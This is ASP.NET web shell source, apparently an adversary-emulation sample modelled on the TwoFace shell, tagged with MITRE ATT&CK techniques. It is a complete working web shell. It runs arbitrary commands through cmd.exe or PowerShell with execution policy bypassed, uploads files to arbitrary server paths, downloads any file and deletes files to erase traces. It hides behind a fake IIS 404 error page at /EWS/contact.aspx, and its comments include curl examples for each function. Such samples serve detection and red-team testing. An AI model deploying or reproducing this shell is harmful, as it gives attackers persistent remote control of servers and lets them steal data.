<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" Async="true" %>
<%@ Import namespace="System"%>
<%@ Import namespace="System.IO"%>
<%@ Import namespace="System.Diagnostics"%>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <script runat="server"> 
        // References(s):
        // https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/

        private static string TempFolder = System.IO.Path.GetTempPath();

        // Adversary connects to webshell to execute commands
        // MITRE ATT&CK Technique: T1505.003 - Server Software Component: Web Shell
        protected void Page_Load(object sender, EventArgs e) {
            if (Request.RequestType == "POST") {
                AdditionalInfo.InnerText = "\n";
                HandlePOSTCmdExecute();
                HandlePOSTFileUploadTemp();
                HandlePOSTFileUploadServer();
                HandlePOSTFileDownloadServer();
                HandlePOSTFileDeleteTemp();
            }
        }
        
        // Temp Directory Upload
        // POST with body data including upd= with the filename and upb= with the Base64 contents of the file
        // Example: curl -k -X POST --data "upd=myfile.txt" --data "upb=ZXhhbXBsZQ==" .../EWS/contact.aspx
        //
        // MITRE ATT&CK Technique: T1041 - Exfiltration over C2 Channel
        private void HandlePOSTFileUploadTemp() {
            string FileContent = Request.Form.Get("upb");
            string Filename = Request.Form.Get("upd");

            if (!string.IsNullOrEmpty(FileContent) && !string.IsNullOrEmpty(Filename)) {
                try {
                    FileContent = FileContent.Replace(" ", "+");
                    byte[] buffer = System.Convert.FromBase64String(FileContent);
                    string FilePath = System.IO.Path.Combine(TempFolder, Filename);

                    using (System.IO.FileStream Writer = new System.IO.FileStream(FilePath, System.IO.FileMode.Create)) {
                        Writer.Write(buffer, 0, buffer.Length);
                    }

                    AdditionalInfo.InnerText += String.Format("Success: {0}\n", FilePath);

                } catch (System.Exception ex) {
                    AdditionalInfo.InnerText += String.Format("Failed: {0}\n", ex.Message);
                }
            }
        }

        // Abritrary Folder Upload
        // POST with body data: 
        //      upl= the field name within the HTTP POST that contains the file contents
        //      sav= with the path to save the file to
        //      vir= with a boolean to dictate whether the file will be saved to a virtual path rather than a physical path
        //      nen= with the specified name of file to upload, otherwise the script uses the filename of the uploaded file
        // Example: 
        //      curl -k -X POST -F "upl=file1" -F 'sav=C:\Users\Public\' -F "vir=false" -F "nen=destname.txt" 
        //      -F "file1=@file.txt" .../EWS/contact.aspx
        //
        // MITRE ATT&CK Technique: T1041 - Exfiltration over C2 Channel
        private void HandlePOSTFileUploadServer() {
            string FieldNameForFile = Request.Form.Get("upl");
            string PathToSave = Request.Form.Get("sav");
            string VirtualPath = Request.Form.Get("vir");
            string SpecifiedName = Request.Form.Get("nen");
            string FilePath = "";
            bool useVirtual = false;
            System.Web.HttpFileCollection FileCollection = Request.Files;

            // vir=true is optional, so unless true is explicitly passed, anything else will be treated as false
            if (VirtualPath == "true") {
                useVirtual = true;
            }

            if (!string.IsNullOrEmpty(PathToSave) && 
                !string.IsNullOrEmpty(FieldNameForFile) && 
                FileCollection.Count > 0) {
                try {
                    
                    if (!System.IO.Directory.Exists(PathToSave)) {
                        System.IO.Directory.CreateDirectory(PathToSave);
                        AdditionalInfo.InnerText += String.Format("Created Directory: {0}\n", PathToSave);
                    }
                } catch (System.Exception ex) {
                    AdditionalInfo.InnerText += ex.Message;
                    return;
                }

                try {
                    System.Web.HttpPostedFile UploadedFile = FileCollection.Get(FieldNameForFile);
                    string Filename = "";

                    // Passing nen= is also considered optional, will use uploaded file name if not specified.
                    if (!string.IsNullOrEmpty(SpecifiedName)) {
                        Filename = SpecifiedName;
                    } else {
                        Filename = UploadedFile.FileName;
                    }

                    if (useVirtual) {
                        FilePath = Server.MapPath("~/" + PathToSave);
                    } else {
                        FilePath = PathToSave;
                    }

                    FilePath = System.IO.Path.Combine(FilePath, Filename);

                    using (System.IO.FileStream Writer = new System.IO.FileStream(FilePath, System.IO.FileMode.Create)) {
                        UploadedFile.InputStream.CopyTo(Writer);
                    }

                    AdditionalInfo.InnerText += String.Format("Success: {0}\n", FilePath);
                } catch (System.Exception ex) {
                    AdditionalInfo.InnerText += String.Format("Failed: {0}\n{1}\n\n", FilePath, ex.Message);
                    return;
                }
            }
        }

        // File Download
        // POST with body data don= with the location to the file you wish to download
        // Example: curl -k -X POST --data "don=C:\Users\Public\file.txt" .../EWS/contact.aspx
        //
        // MITRE ATT&CK Technique: T1105 - Ingress Tool Transfer
        private void HandlePOSTFileDownloadServer()
        {
            string GetDownloadFilename = Request.Form.Get("don");

            if (!string.IsNullOrEmpty(GetDownloadFilename)) {
                try {
                    System.IO.FileInfo FileInfo = new System.IO.FileInfo(GetDownloadFilename);

                    if (FileInfo.Exists) {
                        Response.Clear();
                        Response.AddHeader("Content-Disposition", String.Format("attachment;filename = {0}", 
                                            FileInfo.Name));
                        Response.AddHeader("Content-Length", FileInfo.Length.ToString());
                        Response.Flush();
                        Response.TransmitFile(FileInfo.FullName);
                        Response.End();
                    } else {
                        AdditionalInfo.InnerText = String.Format("Not Found: {0}\n", FileInfo.FullName);
                    }
                }
                catch (System.Exception ex) {
                    AdditionalInfo.InnerText += ex.Message;
                    return;
                }
            }
        }

        // Delete a file from TEMP
        // POST with body data del= with the filename to delete from %TEMP% folder
        // Example: curl -k -X POST --data "del=file.txt" .../EWS/contact.aspx
        //
        // MITRE ATT&CK Technique: T1070.004 - Indicator Removal on Host: File Deletion
        private void HandlePOSTFileDeleteTemp() {
            string GetDeleteFilename = Request.Form.Get("del");

            if (!string.IsNullOrEmpty(GetDeleteFilename)) {
                try {
                    string FilePath = System.IO.Path.Combine(TempFolder, GetDeleteFilename);
                    System.IO.FileInfo FileInfo = new System.IO.FileInfo(FilePath);

                    if (FileInfo.Exists) {
                        FileInfo.Delete();
                        AdditionalInfo.InnerText += String.Format("Deleted: {0}\n", FilePath);
                    } else {
                        AdditionalInfo.InnerText = String.Format("Not Found: {0}\n", FileInfo.FullName);
                    }
                } catch (System.Exception ex) {
                    AdditionalInfo.InnerText += ex.Message;
                    return;
                }
            }
        }

        // Command Execution 
        // POST with body data:
        //      cmd= which holds the command to be executed 
        //      pro= which holds the name of the executor to use (cmd.exe, powershell.exe)
        // Example: curl -k -X POST --data "pro=cmd.exe" --data "cmd=ipconfig /all" .../EWS/contact.aspx
        private async void HandlePOSTCmdExecute() {
            string GetCmd = Request.Form.Get("cmd");
            string GetExecutor = Request.Form.Get("pro");

            if (!string.IsNullOrEmpty(GetCmd) && !string.IsNullOrEmpty(GetExecutor)) {
                try {
                    Process Proc = ProcessBuilder(GetExecutor, GetCmd);

                    await ConsumeReader(Proc.StandardOutput, AdditionalInfo);
                    await ConsumeReader(Proc.StandardError, AdditionalInfo);

                    // timeout on 10 seconds
                    Proc.WaitForExit(10000);
                } catch (System.Exception ex) {
                    AdditionalInfo.InnerText = ex.Message;
                    return;
                }
            }
        }

        // Internal webshell function. It will create a new process instance.
        private Process ProcessBuilder(string executor, string command) {
            string extraArgs = "";

            if (executor == "cmd.exe") {
                extraArgs = "/c ";
            } else if (executor == "powershell.exe") {
                extraArgs = "-ExecutionPolicy bypass -NonInteractive ";
            }

            Process p = new Process();
            p.StartInfo = new ProcessStartInfo();
            p.StartInfo.FileName = executor;
            p.StartInfo.Arguments = extraArgs + command;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;

            p.Start();

            return p;
        }

        // Internal method used to consume the Process object standard output and standard error
        private async static System.Threading.Tasks.Task ConsumeReader(System.IO.TextReader reader, 
                                                                       System.Web.UI.HtmlControls.HtmlGenericControl section) {
            string text;

            while ((text = await reader.ReadLineAsync()) != null) {
                section.InnerText += text + "\n";
            }
        }
    </script>

    <title>The resource cannot be found.</title>
    <meta name="viewport" content="width=device-width" />
    <style>
        body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
        p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
        b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
        H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
        H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
        pre {font-family:"Consolas","Lucida Console",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}
        .marker {font-weight: bold; color: black;text-decoration: none;}
        .version {color: gray;}
        .error {margin-bottom: 10px;}
        .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:pointer; }
        @media screen and (max-width: 639px) {
        pre { width: 440px; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
        }
        @media screen and (max-width: 479px) {
        pre { width: 280px; }
        }
    </style>
</head>

<body bgcolor="white">

    <span><H1>Server Error in '/EWS' Application.<hr width=100% size=1 color=silver></H1>

    <h2> <i>The resource cannot be found.</i> </h2></span>

    <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">

    <b> Description:</b> HTTP 404. The resource you are looking for (or one of its dependencies) could have been removed, 
        had its name changed, or is temporarily unavailable. &nbsp;Please review the following URL and make sure that it 
        is spelled correctly.
    <br><br>

    <b> Requested URL: </b>/EWS/contact.aspx<br><br>

    <hr width=100% size=1 color=silver>

    <b>Version Information:</b>&nbsp;Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.8.4465.0

    </font>
    <pre runat="server" id="AdditionalInfo"/>
</body>
</html>
